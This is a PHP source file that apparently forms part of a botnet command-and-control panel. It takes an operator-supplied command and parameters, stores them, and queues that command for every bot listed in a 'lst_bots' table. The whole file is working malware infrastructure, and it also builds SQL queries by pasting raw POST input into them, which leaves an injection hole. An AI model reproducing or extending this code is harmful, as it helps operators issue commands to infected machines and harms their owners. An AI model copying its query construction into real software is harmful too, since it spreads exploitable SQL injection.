<?php
    include('auth.php');
    include("./inc/config.php");
    if (isset($_POST["addCommand"]) && isset($_POST["addParameters"]))
    {
        $sql = "INSERT INTO `lst_commands` (`ID`, `command`, `parameters`, `max`,`done`) VALUES (NULL, '".$_POST['addCommand']."', '".$_POST['addParameters']."', '0', '0');";
        $res = mysql_query($sql);
        $comID = mysql_insert_id();
        
        $sql = "SELECT * FROM `lst_bots` WHERE 1;";  
        $res = mysql_query($sql);
        for($p=0;$p<mysql_num_rows($res);$p++)
        {
            $data = mysql_fetch_array($res);
            $cmdData = $data['commands'];
            $cmdData = $cmdData."[".$comID."]#";
            $sql = "UPDATE `lst_bots` SET `commands` = '".$cmdData."' WHERE `UID` = '".$data['UID']."';";
            mysql_query($sql);
        }
        echo '{success:true}';
    }
    die("");
?>